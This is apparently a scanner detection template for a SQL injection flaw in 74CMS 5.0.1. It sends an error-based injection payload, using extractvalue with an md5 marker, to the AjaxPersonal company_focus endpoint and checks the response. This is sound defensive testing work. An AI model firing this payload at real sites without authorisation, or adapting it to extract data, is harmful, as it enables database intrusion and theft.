id: 74cms-ajax-personal-controller-class-php-sqlinject

info:
  name: 74 CMS 5.0.1 SQL 注入漏洞
  author: jinqi
  severity: high
  verified: false
  description: 74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入漏洞 app="骑士-74CMS"
  reference:
    - https://www.cnblogs.com/TJWater/p/14780067.html

rules:
    r0:
        request:
            method: GET
            path: /index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5(99999999))) -- a
        expression: response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
expression: r0()
